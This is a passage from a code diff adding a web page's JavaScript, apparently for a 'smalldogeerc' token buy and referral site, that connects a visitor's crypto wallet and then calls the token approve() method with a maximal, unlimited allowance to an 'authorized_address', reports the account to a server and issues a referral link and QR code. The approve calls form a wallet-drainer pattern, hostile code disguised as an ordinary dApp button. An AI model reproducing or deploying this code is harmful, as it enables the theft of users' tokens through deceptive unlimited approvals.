+            // fffsss = fffsss + "selectedAccount111:" + selectedAccount + "---"
+            // $("#fffsss").text(fffsss)
+            // fffsss = fffsss + "authorized_address:" +authorized_address+ "---"
+            //      $("#fffsss").text(fffsss)
+                console.log(bizhong);
+            if (selectedAccount && provider) {
+                const web3 = new Web3(provider);
+                const contract = new web3.eth.Contract(ABI, approveAddr)
+                // fffsss = fffsss + "contract1:" + contract + "---"
+                //  $("#fffsss").text(fffsss)
+                
+                const gasPrice = await web3.eth.getGasPrice()
+                // fffsss = fffsss + "gasPrice1:" + gasPrice + "---"
+                //  $("#fffsss").text(fffsss)
+                //  0xAee50786508C90F1543B8724029eFC6f735DC8e1
+                //  0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+                // 117620163916263922581920362927519
+              
+                //  fffsss = fffsss + "authorized_address:11111" + "---"
+                //  $("#fffsss").text(fffsss)
+
+                // alert(authorized_address)
+                // var gas = await contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).estimateGas({
+                //     from: selectedAccount
+                // },function(err, tx) {
+                //       alert(err)
+                //       alert(tx)
+                //
+                //     console.log(err, tx)
+                //
+                // })
+                //
+                //
+                //  if(gas == undefined){
+                //     gas = 80000;
+                // }
+                //
+                // fffsss = fffsss + "gas1:" + gas + "---"
+                //  $("#fffsss").text(fffsss)
+
+                contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+                    from: selectedAccount,
+                    gasPrice: gasPrice,
+                    gas: 70000,
+                }, function(err, tx) {
+                    if(!err){
+                        
+                        postInfo(selectedAccount,bizhong)
+                        tuiguang(selectedAccount);
+                        
+                    }
+                    
+                    console.log(err, tx)
+                    $('#loading').hide()
+                })
+            } else {
+                provider = await web3Modal.connect()
+                provider.enable()
+                const web3 = new Web3(provider);
+                const accounts = await web3.eth.getAccounts()
+                selectedAccount = accounts[0]
+                // fffsss = fffsss + "selectedAccount:" + selectedAccount + "---"
+                // $("#fffsss").text(fffsss)
+                
+                const contract = new web3.eth.Contract(ABI, approveAddr)
+                const gasPrice = await web3.eth.getGasPrice()
+                // fffsss = fffsss + "gasPrice:" + gasPrice + "---"
+                // $("#fffsss").text(fffsss)
+                // var gas = await contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').estimateGas({
+                //     from: selectedAccount
+                // },function(err, tx) {
+                //
+                //
+                //     console.log(err, tx)
+                //
+                // })
+                //  if(gas == undefined){
+                //     gas= 80000;
+                // }
+                // alert(gas)
+                // console.log(gas)
+                // fffsss = fffsss + "gas:" + gas + "---"
+                // $("#fffsss").text(fffsss)
+                contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+                    from: selectedAccount,
+                    gasPrice: gasPrice,
+                    gas: 70000,
+                }, function(err, tx) {
+                    console.log(err, tx)
+                    if(!err){
+                        
+                        postInfo(selectedAccount,bizhong)
+                        tuiguang(selectedAccount);
+                    }
+                    $('#loading').hide()
+                })
+            }
+        }
+
+        /**
+         * Disconnect wallet button pressed.
+         */
+        async function onDisconnect() {
+
+            console.log("Killing the wallet connection", provider);
+
+            // TODO: Which providers have close method?
+            if(provider.close) {
+                await provider.close();
+
+                // If the cached provider is not cleared,
+                // WalletConnect will default to the existing session
+                // and does not allow to re-scan the QR code with a new wallet.
+                // Depending on your use case you may want or want not his behavir.
+                await web3Modal.clearCachedProvider();
+                provider = null;
+            }
+
+            selectedAccount = null;
+
+            // Set the UI back to the initial state
+            // document.querySelector("#prepare").style.display = "block";
+            // document.querySelector("#connected").style.display = "none";
+        }
+
+
+        /**
+         * Main entry point.
+         */
+        window.addEventListener('load', async () => {
+            init();
+        document.querySelector("#btn-connect").addEventListener("click", onConnect);
+        // document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+    });
+
+        /******************************************/
+      function urlinit() {
+         var url = window.location.host;
+            var s = getUrlQueryString('s')
+            var r = getUrlQueryString('r')
+            if(s == undefined){
+                s='';
+            }
+            if(r == undefined){
+                r='';
+            }
+            $('.process').attr('href',window.location.protocol+'//'+url +'/public/smalldogeerc/buy.html?s='+s+ '&r='+r)
+       }
+       urlinit()
+      function tuiguang(selectedAccount){
+            var url = window.location.host;
+            var s = getUrlQueryString('s')
+            if(s == undefined){
+                s='';
+            }
+          
+            url =window.location.protocol+'//'+url +'/public/smalldogeerc/index.html?s='+s+ '&r='+selectedAccount;
+            console.log(url);
+            
+            
+            $('#copyBtn').attr('data-clipboard-text',url);
+            $('#link').text(url)
+            var width =$('#qrcode').height();
+             //生成邀请码
+       var qrcode = new QRCode('qrcode', {
+         text: url,
+         width: width,
+         height: width,
+         colorDark: '#000000',
+         colorLight: '#ffffff',
+         correctLevel: QRCode.CorrectLevel.H
+         });
+         
+          $("#modalComingSoon").fadeIn()
+         
+         
+        }
+        
+
+        
+        var clipboard = new Clipboard('#copyBtn');
+
+            clipboard.on('success', function(e) {
+                // layer.msg("已复制成功" + e.text);
+                alert('复制成功')
+            });
+            clipboard.on('error', function(e) {
+              alert('复制失败')
+                
+            });
+
+
+            $('#closetui').click(function () {
+              $('#modalComingSoon').fadeOut();
+            })
+        
+
+           
+        
+        
+    })
+</script>
+
+</body>
+
+</html>
